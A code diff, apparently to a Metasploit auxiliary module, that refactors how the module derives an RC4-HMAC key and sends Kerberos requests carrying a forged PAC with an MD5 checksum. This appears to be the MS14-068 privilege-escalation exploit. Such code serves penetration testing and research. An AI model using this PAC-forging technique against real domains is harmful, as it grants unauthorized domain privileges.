@@ -63,11 +63,13 @@ class MetasploitModule < Msf::Auxiliary
     domain_sid = user_sid_arr[0, user_sid_arr.length - 1].join('-')
     user_rid = user_sid_arr[user_sid_arr.length - 1].to_i
 
-    unicode_password = Rex::Text.to_unicode(datastore['PASSWORD'])
-    password_digest = OpenSSL::Digest.digest('MD4', unicode_password)
+    checksum_type = Rex::Proto::Kerberos::Crypto::Checksum::RSA_MD5
+    etype = Rex::Proto::Kerberos::Crypto::Encryption::RC4_HMAC
+    encryptor = Rex::Proto::Kerberos::Crypto::Encryption::from_etype(etype)
+    password_digest = encryptor.string_to_key(datastore['PASSWORD'])
 
     pre_auth = []
-    pre_auth << build_as_pa_time_stamp(key: password_digest, etype: Rex::Proto::Kerberos::Crypto::RC4_HMAC)
+    pre_auth << build_as_pa_time_stamp(key: password_digest, etype: etype)
     pre_auth << build_pa_pac_request
     pre_auth
 
@@ -77,7 +79,8 @@ class MetasploitModule < Msf::Auxiliary
       server_name: "krbtgt/#{domain}",
       realm: "#{domain}",
       key: password_digest,
-      pa_data: pre_auth
+      pa_data: pre_auth,
+      etype: [etype]
     )
 
     unless res.msg_type == Rex::Proto::Kerberos::Model::AS_REP
@@ -110,11 +113,11 @@ class MetasploitModule < Msf::Auxiliary
       user_id: user_rid,
       realm: domain,
       logon_time: logon_time,
-      checksum_type: Rex::Proto::Kerberos::Crypto::RSA_MD5
+      checksum_type: checksum_type
     )
 
     auth_data = build_pac_authorization_data(pac: pac)
-    sub_key = build_subkey(subkey_type: Rex::Proto::Kerberos::Crypto::RC4_HMAC)
+    sub_key = build_subkey(subkey_type: etype)
 
     print_status("#{peer} - Sending TGS-REQ...")
 
